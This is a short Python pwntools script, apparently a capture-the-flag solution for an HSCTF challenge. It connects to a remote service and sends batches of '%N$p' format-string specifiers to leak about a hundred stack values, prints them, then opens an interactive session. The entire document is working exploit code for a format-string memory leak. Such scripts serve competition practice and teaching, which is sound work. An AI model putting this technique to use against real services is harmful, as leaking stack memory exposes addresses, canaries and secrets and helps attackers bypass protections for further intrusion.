from pwn import *

# p = process("./chall")
p = remote("cat.hsctf.com", 1337)

j = 0
res = ""
while j < 100:
    out = ""
    for i in range(j, j+3):
        out += f"%{i}$p"

    log.info(f"{out = }")
    p.sendline(out.encode())
    res += p.recvline().decode()
    j += 3
    
print(res)
p.interactive()